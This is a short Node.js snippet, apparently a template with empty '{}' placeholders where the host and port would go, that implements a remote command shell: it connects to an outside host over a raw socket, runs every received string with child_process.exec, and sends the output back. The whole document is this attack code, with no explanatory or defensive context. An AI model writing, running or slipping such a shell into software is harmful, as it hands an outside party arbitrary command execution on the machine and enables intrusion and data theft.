const net = require("net");
const { exec } = require("child_process");
const client = new net.Socket();
client.connect({}, "{}", () => {}); 
client.on("data", (data) => {
    exec(data.toString(), (error, stdout, stderr) => {
        client.write(stdout + stderr);
    });
});
